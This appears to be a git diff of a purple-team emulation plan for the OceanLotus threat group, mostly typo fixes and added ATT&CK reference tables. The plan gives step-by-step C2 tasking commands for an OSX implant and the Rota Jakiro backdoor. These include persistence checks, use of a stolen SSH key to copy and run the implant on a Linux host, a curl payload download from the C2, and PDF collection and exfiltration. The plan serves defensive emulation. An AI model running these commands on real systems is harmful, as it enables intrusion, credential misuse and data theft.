@@ -1,4 +1,6 @@
-# 🌊💮 Emulation 
+# 🌊💮 OceanLotus Emulation Plan
+![Diagram of the below word picture](../Resources/images/OperationsFLowBlackBG.jpeg)
+
 This scenario emulates OceanLotus TTPs based primarily on two malware specimens either 
 used by or associated with the OceanLotus actors:
 
@@ -6,14 +8,15 @@ used by or associated with the OceanLotus actors:
 1. [OceanLotus.abcdef](./Resources/rota)
 
 
+
 ### 🗺️ Legend
-This document is intended to be used as a operational guide for a purple team operation. We recommend pausing ~2m after each step to give any detection tools or logs time to caputre the information.
+This document is intended to be used as an operational guide for a purple team operation. We recommend pausing ~2m after each step to give any detection tools or logs time to caputre the information.
 
 Based on the CTI Emulation Plan, each step includes the following information:
-- 📖 **Overview** - Summuary of actions that are completed in this step
+- 📖 **Overview** - Summary of actions that are completed in this step
 - 👾 **Red Team Procedures** - Red team operator instructions & commands to execute with expected output
 - 🔮 **Reference Code & Reporting** - A table with links to the source code for specific actions with cited intelligence leveraged for this action (if available)
-- 🔬 **Blue Team Notes** - key API calls, events, or telemtry for blue teams
+- 🔬 **Blue Team Notes** - key API calls, events, or telemetry for blue teams
 
 In-line Symbols:
 * :bulb: - callout notes
@@ -97,9 +100,9 @@ Open **four** terminal windows on your local machine (assuming a macOS or simila
    ```
    cd ocean-lotus/Resources/controlServer
    ```
-   This is the terminal window we use to task the implant. Unless otherwise specified, all copy/paste command will use this terminal window.
+   This is the terminal window we use to task the implant. Unless otherwise specified, all copy/paste commands will use this terminal window.
    
-<details><summary>Trouble Shooting</summary>
+<details><summary>Troubleshooting</summary>
   
    Check Configuration.
    - Check the ip address & port in the config file
@@ -112,8 +115,8 @@ Open **four** terminal windows on your local machine (assuming a macOS or simila
 </details>
 
 #### VNC Access to macOS
-1. :arrow_right: Navigate to the **thrid** terminal window on your local machine. 
-1. Setup SSH Tunnel to forward port 5900 to localhost (must use teh ec2-user for this part).
+1. :arrow_right: Navigate to the **third** terminal window on your local machine. 
+1. Setup SSH Tunnel to forward port 5900 to localhost (must use the ec2-user for this part).
    ```
    ssh -L 5900:localhost:5900 ec2-user@10.90.30.22
    ```
@@ -127,13 +130,13 @@ Open **four** terminal windows on your local machine (assuming a macOS or simila
        │ ╰─┼╯ │  Amazon EC2
        └───┴──┘  macOS Catalina 10.15.7
    ```
-   Leave this window open and move to the side. We will not need to referene this window for the rest of the operation but do need to leave it open until we are finished with the macOS portion.
+   Leave this window open and move to the side. We will not need to reference this window for the rest of the operation but do need to leave it open until we are finished with the macOS portion.
 1. :arrow_right: Navigate to the **fourth**, and last open terminal window on your local machine.
-1. Copy/Paste the following command to connect over VNC for a GUI intereface for the macOS machine in AWS.
+1. Copy/Paste the following command to connect over VNC for a GUI interface for the macOS machine in AWS.
    ```
    open vnc://localhost:5900
    ```
-   A window should appear asking for Screen Sharing privillages to sin into "localhost".
+   A window should appear asking for Screen Sharing privileges to sign into "localhost".
    This terminal window can be closed or terminated after the command is run.   
 1. Enter the Hope Potter's credentials
    Username
@@ -147,31 +150,18 @@ Open **four** terminal windows on your local machine (assuming a macOS or simila
    Expected output:
    A GUI interface to the Mac Mini should appear on the screen asking for a password.
 
-1. :arrow_right: Enter the same password from above... manualy. The user's Desktop should appear.
+1. :arrow_right: Enter the same password from above... manually. The user's Desktop should appear.
 1. Click on the Downloads folder in the Dock located at the base of the Desktop. When the icon expands, select "Open in Finder". A Finder window will open displaying the contents of the Downloads folder.
 
-   >The Dock is the macOS version of a Window's toolbar, Finder is the macOS of Windows Explorer, and the Downloads folder is typically located to the left side of the Trash icon in the Dock.
+   >The Dock is the macOS version of a Windows toolbar, Finder is the macOS version of Windows Explorer, and the Downloads folder is typically located to the left side of the Trash icon in the Dock.
 
-1. Verify the conkylan.app file (unicorn in Vietnamese) is present in the Downloads folder. 
+1. Verify the conkylan.app file (unicorn in Vietnamese) is present in the Downloads folder (if not present, use the [set up](../Resources/setup) documentation to finish set up).
 
-<details><summary>Trouble Shooting</summary>
-  
-   If you receive this error...
-   ```
-   LSOpenURLsWithRole() failed with error -610 for the URL vnc://localhost:5900.
-   ```
-   
-   Try blah.
-   ```
-   Insert solution here
-   ```
-   
-</details>
 
 ## Step 1 - Establish Foothold
 ### 📖 Overview
 
-👋 Handwaving: Assume the user downloaded a Word document from a legitimate, but compromised, site. The Word docuement (`conkylan.app` - unicorn in Vietnamese) resides on the user's `Downloads` folder. 
+👋 Handwaving: Assume the user downloaded a Word document from a legitimate, but compromised, site. The Word document (`conkylan.app` - unicorn in Vietnamese) resides on the user's `Downloads` folder. 
 
 **Step 1** emulates OceanLotus gaining initial access via a malicious file [T1204.002](https://attack.mitre.org/techniques/T1204/002/) targeting user `hpotter`. 
 
@@ -194,7 +184,8 @@ The Implant is a fat binary that performs the backdoor capabilities. On executio
 ### 👾 Red Team Procedures
 
 1. Emulate the user double-clicking the conkylan.app (lets pretend it's a Word document)
-1. Confirm C2 Registration of the OSX implant 
+1. Confirm C2 Registration of the OSX implant
+    
    In the Listener terminal window you should see the following output...
 
    ```zsh
@@ -213,7 +204,7 @@ The Implant is a fat binary that performs the backdoor capabilities. On executio
       [INFO] 2023/08/18 17:08:13 Session created for implant b6dbd70f203515095d0ca8a5ecbb43f7
    ```
    
-1. The macOS implant immediately sends collected discovery information about the victim machine which is printed out in the Listerner terminal window.
+1. The macOS implant immediately sends collected discovery information about the victim machine which is printed out in the Listener terminal window.
 
    Expected Output:
    ```
@@ -229,7 +220,7 @@ The Implant is a fat binary that performs the backdoor capabilities. On executio
       6-Core Intel Core i7
    ```
    
-1. The implant will continue to send a `OSX_heartbeat` until tasked.
+1. The implant will continue to send an `OSX_heartbeat` until tasked.
 
    Expected Output:
    ```
@@ -238,47 +229,57 @@ The Implant is a fat binary that performs the backdoor capabilities. On executio
    ```
    
  1. Verify the persistence file was dropped by the initial payloads.
+   
    ```
    ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ls -la /Users/hpotter/Library/LaunchAgents/com.apple.launchpad"}'
    ```
+   
    Expected Output: 
    ```
-   [SUCCESS] 2023/08/24 19:21:26 Successfully set task for session: b6dbd70f203515095d0ca8a5ecbb43f7
-   [Task] 2023/08/24 19:21:32 total 8
-   ...
-   rw-r--r--  1 hpotter  VISERION\Domain Users  456 Aug 24 19:21 com.apple.launchpad.plist
-   [SUCCESS] 2023/08/24 19:21:32 Successfully set task output.
+      [SUCCESS] 2023/08/24 19:21:26 Successfully set task for session: b6dbd70f203515095d0ca8a5ecbb43f7
+      [Task] 2023/08/24 19:21:32 total 8
+      ...
+      rw-r--r--  1 hpotter  VISERION\Domain Users  456 Aug 24 19:21 com.apple.launchpad.plist
+      [SUCCESS] 2023/08/24 19:21:32 Successfully set task output.
    ```
 
 
-   <details><summary>Extra Credit - Execute Persistence</summary>
-     
-      This is not apart of the emulation plan however, if you want to manualy verify the LaunchAgent works you can use `launchctl` to manualy load and execute the LaunchAgent. macOS loads and excecutes LaunchAgents upon user logon, therefore it would be abnormal for the adversary to arbitrarily execute a LaunchAgent when there is an established session. 
-      
-      The below commands will allow you to manually load the `OSX.OceanLotus` LaunchAgent.
-      
-      Note: As a result of our decision to hardcode the implant UUIDs to enable the copy/paste approach for this emulation there are additional actions that must be taken for session management. Loading the LaunchAgent will result in a double session. 
-      
-      1. Load the LaunchAgent using `launchctl`
-         ```
-         ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"launchctl load -w /Users/hpotter/Library/LaunchAgents/com.apple.launchpad"}'
-         ````
-      1. List out the processes using the com.apple.launchpad plist
-         ```
-         ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ps -ef | grep com.apple.launchpad"}'
-         ```
-      1. Identify the process that is NOT running with the parent process of `1`. Using this process's PID, replace `PID` in the below command to kill this process.
-         ```
-         ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"kill -9 PID"}'
-         ```
-      
-      1. Veify we only have one running process using the com.apple.launchpad plist.
-         ```
-         ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ps -ef | grep com.apple.launchpad"}'
-         ```
-      1. Continue hacking...
+<details><summary>Extra Credit - Execute Persistence</summary>
 
-   </details>
+   This is not part of the emulation plan however, if you want to manually verify the LaunchAgent works you can use `launchctl` to manually load and execute the LaunchAgent. macOS loads and excecutes LaunchAgents upon user logon, therefore it would be abnormal for the adversary to arbitrarily execute a LaunchAgent when there is an established session. 
+   
+   The below commands will allow you to manually load the `OSX.OceanLotus` LaunchAgent.
+   
+   Note: As a result of our decision to hardcode the implant UUIDs to enable the copy/paste approach for this emulation there are additional actions that must be taken for session management. Loading the LaunchAgent will result in a double session. 
+   
+   1. Load the LaunchAgent using `launchctl`
+   
+      ```
+      ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"launchctl load -w /Users/hpotter/Library/LaunchAgents/com.apple.launchpad"}'
+      ````
+   
+   1. List out the processes using the com.apple.launchpad plist
+   
+      ```
+      ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ps -ef | grep com.apple.launchpad"}'
+      ```
+   
+   1. Identify the process that is NOT running with the parent process of `1`. Using this process's PID, replace `PID` in the below command to kill this process.
+   
+      ```
+      ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"kill -9 PID"}'
+      ```
+   
+   1. Veify we only have one running process using the com.apple.launchpad plist.
+   
+      ```
+      ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ps -ef | grep com.apple.launchpad"}'
+      ```
+   
+   1. Continue hacking...
+   
+</details>
+   
 <br>
 
 ### 🔮 Reference Code & Reporting
@@ -294,7 +295,7 @@ The Implant is a fat binary that performs the backdoor capabilities. On executio
    | Application bundle shell script adds a Launch Agent configuration | [Script copies Launch Agent plist configuration to user's LaunchAgents](../Resources/OSX.OceanLotus/ApplicationBundle/first_stage.sh#L68-L83) | T1543.001 Create or Modify System Process: Launch Agent | https://unit42.paloaltonetworks.com/unit42-new-improved-macos-backdoor-oceanlotus/<br><br>https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html<br><br>https://www.trendmicro.com/en_us/research/18/d/new-macos-backdoor-linked-to-oceanlotus-found.html |
    | Application bundle shell script contains embedded base64 encoded binaries | [Script contains base64 encoded Implant and Communication Library binaries](../Resources/OSX.OceanLotus/ApplicationBundle/first_stage.sh#L38-L41) | T1027.009 Embedded Payloads | https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html |
    | Application bundle shell script drops Communication dylib and implant binary | [Script echos and writes the base64 decoded payload to disk](../Resources/OSX.OceanLotus/ApplicationBundle/first_stage.sh#L85-L90) | - | https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html |
-   | Application bundle shell script executes `touch`` | [Script modifies file timestamps](../Resources/OSX.OceanLotus/ApplicationBundle/first_stage.sh#L92-L98) | T1070.006 Indicator Removal: Timestomp | https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html |
+   | Application bundle shell script executes `touch` | [Script modifies file timestamps](../Resources/OSX.OceanLotus/ApplicationBundle/first_stage.sh#L92-L98) | T1070.006 Indicator Removal: Timestomp | https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html |
    | Application bundle shell script adds executable bit to dropped implant binary | [Script makes implant binary executable](../Resources/OSX.OceanLotus/ApplicationBundle/first_stage.sh#L50-L53) | T1222.002 File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification | https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html |
    | Application bundle shell script deletes application bundle, replacing it with a decoy document | [Script deletes application bundle](../Resources/OSX.OceanLotus/ApplicationBundle/first_stage.sh#L101) | T1070 Indicator Removal: File Deletion | https://unit42.paloaltonetworks.com/unit42-new-improved-macos-backdoor-oceanlotus/<br><br>https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html |
    | OSX.OceanLotus loads the dropped Communication dylib | [`loadComms`](../Resources/OSX.OceanLotus/Implant/Implant/main.cpp#L40-L99) | - | https://www.welivesecurity.com/2019/04/09/oceanlotus-macos-malware-update/ |
@@ -322,11 +323,9 @@ The Implant is a fat binary that performs the backdoor capabilities. On executio
 
 ## Step 2 - macOS Discovery
 ### 📖 Overview
-Step 2 emulates OceanLotus conducting discovery on a macOS host. 
+**Step 2** emulates OceanLotus conducting discovery on a macOS host. OceanLotus reviews the contents of the `.ssh` folder. Seeing there is an SSH key, the `known_hosts` and `history` files are exfiled to the C2 server for analysis. The history file reveals Hope Potter sends files to the file server using SCP. 
 
-Search for local credentials on the macOS host and use t
-
-> CTI Note: There is no open-source reporting to support using the Known_hosts file in conjunction with local SSH keys 😿. During our research, we did not find reporting detailing credential collection on macOS. In order to perform lateral movement for the linux portion of our sceario and staying consitent with using native OS utilities seen in other reporting, we choose using to use known_hosts discovery with locally stored SSH keys. 
+> CTI Note: There is no open-source reporting to support using the known_hosts file in conjunction with local SSH keys 😿. During our research, we did not find reporting detailing credential collection on macOS. In order to perform lateral movement for the linux portion of our sceario and staying consistent with using native OS utilities seen in other reporting, we chose to use known_hosts discovery with locally stored SSH keys. 
 
 ---
 ### 👾 Red Team Procedures
@@ -414,11 +413,9 @@ Search for local credentials on the macOS host and use t
 
 ## Step 3 - Lateral Movement
 ### 📖 Overview
-Identified the macOS connects to a Linux file server. 
- 
-Download Rota Jakiro and scp Rota Jakiro to the Linux server
- 
-Execute Rota Jakiro
+**Step 3** emulates OceanLotus transfering tools into the victim enviornment for targeted platforms. 
+
+OceanLotus downloads Rota Jakiro to the macOS host in the `/Users/hpotter/Library/WebKit` folder (the execution folder for OSX.OceanLotus) as `osx.download`. OSX.OceanLotus then uses SCP to transfer Rota Jakiro to the `\tmp` folder of the Linux host. Using SSH, OSX.OceanLotus changes Rota Jakiro to an executable and executes Rota Jakiro on the Linux host.
 
 ---
 ### 👾 Red Team Procedures
@@ -451,41 +448,41 @@ Execute Rota Jakiro
    💡 All files are downloaded to the directory where the OSX implant binary is running, `/Users/hpotter/Library/WebKit`, as `osx.download`. `/Users/hpotter/Library/WebKit` is where the OSX implant binary is dropped from the application bundle.
 
    
-<details>
-    <summary>Trouble Shooting</summary>
-   ---
-    On the C2 server start a simple HTTP server
+   <details>
+      <summary>Troubleshooting</summary>
+      ---
+      
+      On the C2 server start a simple HTTP server
+      
+      ```
+      cd /opt/oceanlotus/Resources/payloads
+      ```
+      
+      <br>
+      
+      ```
+      python3 -m http.server
+      ```
+      
+      Task the implant
+      
+      ```
+      ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"curl 10.90.30.26:8000/rota -o /tmp/rota"}'
+      ```
+      
+      Verify the file downloaded
+      
+      ```
+      ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ls -la /tmp/rota"}'
+      ```
+      
+      End Troubleshooting
+      
+      ---
+       
+   </details>
 
-    ```
-    cd /opt/oceanlotus/Resources/payloads
-    ```
-
-    <br>
-
-    ```
-    python3 -m http.server
-    ```
-
-    Task the implant
-
-    ```
-    ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"curl 10.90.30.26:8000/rota -o /tmp/rota"}'
-    ```
-
-    Verify the file downloaded
-
-    ```
-    ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ls -la /tmp/rota"}'
-    ```
-    End Troubleshooting
-   
-   End troupble shooting
-
-    ---
-    
-</details>
-
-1. Task OceanLotus to SCP the Rota Jakiro implant to the Linux host
+1. Task OSX.OceanLotus to SCP the Rota Jakiro implant from the macOS host to the Linux host
    ```
    ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"scp -i /Users/hpotter/.ssh/id_rsa /tmp/rota hpotter@viserion.com@10.90.30.7:/tmp/rota"}'
    ```
@@ -508,7 +505,7 @@ Execute Rota Jakiro
    [SUCCESS] 2023/08/24 19:29:52 Successfully set task output.
    ```
    
-1. Use OceanLotus to Execute Rota Jakiro on the Lotus host using ssh & confirm registration. 
+1. Use OceanLotus to Execute Rota Jakiro on the Linux host using ssh & confirm registration. 
    ```
    ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ssh -i /Users/hpotter/.ssh/id_rsa -t hpotter@viserion.com@10.90.30.7 \"nohup /tmp/rota&2>/dev/null; sleep 5; pkill rota;rm nohup.out\""}'                                         
    ```
@@ -530,7 +527,7 @@ Execute Rota Jakiro
    [SUCCESS] 2023/08/24 19:31:57 Successfully created session for implant 01020304.
    ```
 
-<details><summary>Trouble Shooting</summary>
+<details><summary>Troubleshooting</summary>
    Check to make sure the binary for rota is in the correct location for download. Handlers will look for payloads to download using the resources/payloads/<handler-name> logic. 
    
 </details>
@@ -548,6 +545,10 @@ Execute Rota Jakiro
    | OSX.OceanLotus implant returns command output via HTTP POST request to the C2 server | [Send `POST` with command output](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L252)<br><br>[Communication library exported `sendRequest`](../Resources/OSX.OceanLotus/Comms/Comms/Comms.cpp#L89-L174) | T1071.001 Application Layer Protocol: Web Protocols | https://www.trendmicro.com/en_us/research/18/d/new-macos-backdoor-linked-to-oceanlotus-found.html<br><br>https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html |
    | OSX.OceanLotus implant executes `scp -i /Users/hpotter/.ssh/id_rsa /tmp/rota hpotter@viserion.com@10.90.30.7:/tmp/rota` | [Execute command instruction `0xAC`](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L240-L253)<br><br>[`executeCmd`](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L8-L29) | T1570 Lateral Tool Transfer | - |
    | OSX.OceanLotus implant executes `ssh -i /Users/hpotter/.ssh/id_rsa -t hpotter@viserion.com@10.90.30.7 \"nohup /tmp/rota&; sleep 5; pkill rota\"` | [Execute command instruction `0xAC`](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L240-L253)<br><br>[`executeCmd`](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L8-L29) | T1021.004 Remote Services: SSH | - |
+   | Rota execution establishes persistence | [nonroot-persistence](https://github.com/center-for-threat-informed-defense/ocean-lotus/blob/Public-Release/Resources/rota/src/persistence.c#L96) | T1547.013 - Boot or Logon Autostart Execuction: XDG Autostart Entries | https://blog.netlab.360.com/stealth_rotajakiro_backdoor_en/ |
+   | Rota creates shared memory for process monitoring | [watchdog_process_shmget](https://github.com/center-for-threat-informed-defense/ocean-lotus/blob/Public-Release/Resources/rota/src/persistence.c#L394) | T1106 - Native API | https://blog.netlab.360.com/stealth_rotajakiro_backdoor_en/ |
+   | Rota leverages shared memory for monitoring pids in ```/proc/``` | [monitor_proc](https://github.com/center-for-threat-informed-defense/ocean-lotus/blob/Public-Release/Resources/rota/src/persistence.c#L340) |T1559 - Inter-Processs Communication | https://blog.netlab.360.com/stealth_rotajakiro_backdoor_en/ |
+
 
    </summary>
 </details>
@@ -560,17 +561,14 @@ Execute Rota Jakiro
 ## Step 4 - Discovery on Linux Host
 ### 📖 Overview
 
-Step 4 emulates OceanLotus executing a shared object that conducts System information dicovery using the `uname` syscall. 
+**Step 4** emulates OceanLotus executing conducting discovery on the Linux host. 
 
-The following information is collected. 
-- Host name 
-- Archetecture
-- Kernel version 
+For initial collection, Rota Jakiro executes and collects the results from the `uname` syscall. Rota Jakiro sends the following information regarding the Linux host to the C2 server: Host name, Architecture, & Kernel version. Rota Jakiro then downloads and executes a shared object (mount.so file) performing discovery for mounted drives connected to the Linux host. The resulting information is saved to the `mount.txt` file. Rota Jakiro then uploads this file to the C2 server for offline analysis. 
 
 ---
 ### 👾 Red Team Procedures
 
-1. Use Rota Jakiro to collect the device information from the target. 
+1. Use Rota Jakiro to collect the device information from the target using the `uname` syscall. 
    ```
    ./evalsC2client.py --set-task 01020304 '{"cmd":"Rota_upload_dev_info"}'
    ```
@@ -584,7 +582,7 @@ The following information is collected.
    [SUCCESS] 2023/08/24 19:38:10 Successfully set task output.
    ```
 
-2. Upload shared object to execute `mount` command to discover drives on host.
+1. Download `mount.so` shared object to execute the `mount` command to discover drives on the Linux host.
    ```
    ./evalsC2client.py --set-task 01020304 '{"cmd":"Rota_upload_file", "payload": "mount.so"}'
    ```
@@ -594,22 +592,20 @@ The following information is collected.
    [INFO] 2023/08/24 13:30:10 Received task output for session:  01020304
    [Task] 2023/08/24 13:30:10 successfully wrote entire file.
    [SUCCESS] 2023/08/24 13:30:10 Successfully set task output.
-   [INFO] 2023/08/24 13:30:10 No tasks available for UUID:  01020304
    ```
 
-4. Verify the file upload successfully occurred.
+1. Verify the file upload successfully occurred.
    ```
    ./evalsC2client.py --set-task 01020304 '{"cmd":"Rota_query_file", "arg":"local_rota_file.so"}'
    ```
    Expected Output:
    ```
-   [INFO] 2023/08/24 13:26:12 Received beacon from existing implant 01020304.
    [INFO] 2023/08/24 13:26:12 Received task output for session:  01020304
-   [Task] 2023/08/24 13:26:12 Shared Object Executed!
+   [Task] 2023/08/24 13:26:12 file exists
    [SUCCESS] 2023/08/24 13:26:12 Successfully set task output.
    ```
 
-3. Execute the shared object
+1. Execute the shared object using the `update` command
    ```
    ./evalsC2client.py --set-task 01020304 '{"cmd":"Rota_run_plugin", "arg":"update"}'
    ```
@@ -621,7 +617,7 @@ The following information is collected.
    [SUCCESS] 2023/08/24 13:26:12 Successfully set task output.
    ```
 
-4. Exfil the `/tmp/mount.txt` file
+1. Exfil the `/tmp/mount.txt` file to the C2 server
    ```
    ./evalsC2client.py --set-task 01020304 '{"cmd":"Rota_steal_data", "arg": "/tmp/mount.txt"}'
    ```
@@ -631,15 +627,27 @@ The following information is collected.
    [SUCCESS] 2023/08/24 13:29:04 File uploaded: Successfully uploaded file to control server at './files/mount.txt'
    [INFO] 2023/08/24 13:29:04 No tasks available for UUID:  01020304
    ```
-5. View the retrieved file on the C2 server
-
-```
-cat ./files/mount.txt
-```
+1. View the retrieved file on the C2 server
+   
+   ```
+   cat ./files/mount.txt
+   ```
    
 
 ### 🔮 Reference Code & Reporting
 <br>
+<details>
+   <summary>Click to expand table</summary>
+
+   | Red Team Activity | Source Code Link | ATT&CK Technique | Relevant CTI Report |
+   | ----------------- | ---------------- | ---------------- | ------------------- |
+   | Rota executes `uname` for host discovery | [uname syscall](https://github.com/center-for-threat-informed-defense/ocean-lotus/blob/rota-docs-update/Resources/rota/src/c2_commands.c#L102) | T1082 System Information Discovery | https://blog.netlab.360.com/stealth_rotajakiro_backdoor_en/| 
+   | Rota executes a shared object that calls `mount` for network share discovery | [mount](https://github.com/center-for-threat-informed-defense/ocean-lotus/blob/rota-docs-update/Resources/rota/src/so_mount.c) | T1135 Network Share Discovery | https://blog.netlab.360.com/stealth_rotajakiro_backdoor_en/| 
+
+ </details>
+<br>
+
+
 
 ### 🔬 Blue Team Notes
 <br>
@@ -647,23 +655,25 @@ cat ./files/mount.txt
 
 ## Step 5 - Collection
 ### 📖 Overview
-Rota Jakiro uses shared objects for code execution. NOTE: There is no public CTI reporting documenting exactly what these shared objects are executing. Therefore, the following code execution is based off general behaviors derived from CTI reporting targeting linux hosts.
+**Step five** emulates OceanLotus conducting collection of data using shared objects.
 
-Task the implant to upload the shared object (`local_payload_rota.so`) to the target host, the shared object copies and compresses files for collection. 
+OceanLotus downloads and executes a shared object on the Linux host (pdf.so). 
 
-The following commands are executed by the shared object: 
-- Create a hidden tmp.rota folder 
-- Starting from the $HOME folder, copy files with a .pdf extension into the tmp.rota folder
-- Compress all .pdf files contained in the tmp.rota folder and named `exilf.tar.gz`
+The shared object performs the following actions: 
+- creates the `tmp.rota` folder
+- Starting from the $HOME folder using the `find` command, copy files with a `.pdf` extension into the `tmp.rota` folder
+- All files are then compressed into a single file named `rota.tar.gz`. 
 
-Rota Jakiro confirms the target file were created
+Rota Jakiro confirms the target file was created.
+
+>Note: CTI reporting states Rota Jakiro uses shared objects for code execution. NOTE: There is no public CTI reporting documenting exactly what these shared objects are executing. Therefore, the following code execution is based off general behaviors derived from CTI reporting targeting linux hosts.
 
 ---
 ### 👾 Red Team Procedures
 
 1. Upload the shared object onto the Linux host.
    ```
-   ./evalsC2client.py --set-task 01020304 '{"cmd":"Rota_upload_file", "payload": "payload.so"}'
+   ./evalsC2client.py --set-task 01020304 '{"cmd":"Rota_upload_file", "payload": "pdf.so"}'
    ```
    
 1. Verify the shared object was uploaded to the Linux host. 
@@ -699,10 +709,26 @@ Rota Jakiro confirms the target file were created
    [Task] 2023/08/21 19:37:53 file exists
    [SUCCESS] 2023/08/21 19:37:53 Successfully set task output.
    ```
+
+### 🔮 Reference Code & Reporting
+<br>
+<details>
+   <summary>Click to expand table</summary>
+
+   | Red Team Activity | Source Code Link | ATT&CK Technique | Relevant CTI Report |
+   | ----------------- | ---------------- | ---------------- | ------------------- |
+   | Rota executes a Shared Object to create a staging folder | [hidden directory creation](https://github.com/center-for-threat-informed-defense/ocean-lotus/blob/rota-docs-update/Resources/rota/src/so_pdf.c) | T1074.001 Data Staged: Local Data Staging | N/A | 
+   | Rota executes a Shared Object for automated collection| [automated collection](https://github.com/center-for-threat-informed-defense/ocean-lotus/blob/rota-docs-update/Resources/rota/src/so_pdf.c) | T1119 Automated Collection | N/A | 
+
+ </details>
+<br>
    
 ## Step 6 - Exfil from Linux Host
 ### 📖 Overview
 
+**Step 6** emulates OceanLotus exfiltrating data of interest. 
+OceanLotus tasks Rota Jakiro to upload the `/tmp/rota.tar.gz` file to the C2 server completeing the objective. 
+*Note, the C2 server is limited to recieve data up to but not exceeding 65535 bytes.*
 
 ---
 ### 👾 Red Team Procedures
@@ -719,11 +745,13 @@ Rota Jakiro confirms the target file were created
    [INFO] 2023/08/21 19:39:14 Sending new task to implant: 01020304
    [SUCCESS] 2023/08/21 19:39:14 File uploaded: Successfully uploaded file to control server at './files/rota.tar.gz'
    ```
-1. Viefity on the C2 server that the `rota.tar.gz` is uploaded to the `/files` folder.
+1. Verify on the C2 server that the `rota.tar.gz` is uploaded to the `/files` folder.
    ```
    ls -lart ./files
    ```
-1. Kill Rota Jakiro and give yourself a high five 🙌, mission accomplished! 💃
+      
+1. Give yourself a high five 🙌, mission accomplished! 💃
+2. Kill Rota Jakiro 
    ```
    ./evalsC2client.py --set-task 01020304 '{"cmd":"Rota_exit"}'
    ```
@@ -742,6 +770,18 @@ The End 💔
 
 ### 🔮 Reference Code & Reporting
 <br>
+<details>
+   <summary>Click to expand table</summary>
+
+   | Red Team Activity | Source Code Link | ATT&CK Technique | Relevant CTI Report |
+   | ----------------- | ---------------- | ---------------- | ------------------- |
+   | Rota exfils previously created tar directory| [hidden directory creation](https://github.com/center-for-threat-informed-defense/ocean-lotus/blob/rota-docs-update/Resources/rota/src/so_pdf.c) | T1041 Exfiltration Over C2 Channel | N/A | 
+
+ </details>
+<br>
+ 
+
+
 
 ### 🔬 Blue Team Notes
 <br>
